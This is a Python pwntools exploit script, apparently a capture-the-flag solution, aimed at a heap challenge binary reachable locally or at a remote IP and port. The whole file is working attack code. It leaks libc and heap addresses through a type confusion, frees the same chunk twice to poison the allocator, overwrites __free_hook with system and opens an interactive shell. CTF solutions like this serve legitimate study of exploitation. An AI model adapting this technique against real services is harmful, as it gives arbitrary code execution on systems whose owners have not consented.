#!/usr/bin/env python
from pwn import *

def add(data, typ=1):
    s.sendlineafter('> ', '1')
    s.sendlineafter('3): ', str(typ))
    s.sendafter('Data: ', str(data))

def get(index, typ):
    s.sendlineafter('> ', '2')
    s.sendlineafter('Index: ', str(index))
    s.sendlineafter('3): ', str(typ))
    s.recvuntil('Data: ')
    return s.recvline(False)

def delete(index):
    s.sendlineafter('> ', '4')
    s.sendlineafter('Index: ', str(index))

if len(sys.argv) == 1:
    s = process('./chall', env={'LD_LIBRARY_PATH': '.'})
else:
    s = remote('13.231.207.73', 9007)

elf = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add(elf.got['puts'])
libc_base = u64(get(0, 3).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)
libc.address = libc_base

add('A', 3)
heap_addr = int(get(1, 1))
log.info('heap address: %#x' % heap_addr)

add(heap_addr)
delete(2)
delete(1)

add(p64(libc.symbols['__free_hook']), 3)
add('/bin/sh\0', 3)
add(p64(libc.symbols['system']), 3)
delete(1)

s.interactive()
